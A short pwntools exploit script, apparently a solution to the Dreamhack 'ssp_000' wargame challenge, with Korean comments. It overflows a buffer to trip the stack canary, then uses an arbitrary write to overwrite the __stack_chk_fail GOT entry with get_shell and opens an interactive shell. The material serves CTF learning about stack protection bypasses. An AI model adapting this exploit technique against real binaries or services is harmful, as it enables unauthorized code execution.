from pwn import *
context.log_level='debug'
p = remote('host3.dreamhack.games' ,20444)
#p = process('./ssp_000')
e = ELF('./ssp_000')


get_shell = e.symbols['get_shell']
stack_chk_fail_got = e.got['__stack_chk_fail']
payload = b'A'*0x48 #rbp ~ rsp 크기 -> canary 변조 가능
#0x49만 해도 될듯 -> canary leak을 통해서 stack_chk_fail 을 일으키는게 목적
#canary 위치 <- [rbp-0x8]
#buf 위치 <- [rbp-0x50] 근데 48될때 canary_chk_fail이 잡히네???
p.sendline(payload)
p.sendlineafter("Addr : ",str(stack_chk_fail_got))
p.sendlineafter("Value : ",str(get_shell))
#*addr = value <- got overwrite 가능 
#stack_chk_fail_got -> get_shell addr로 변조함
p.interactive()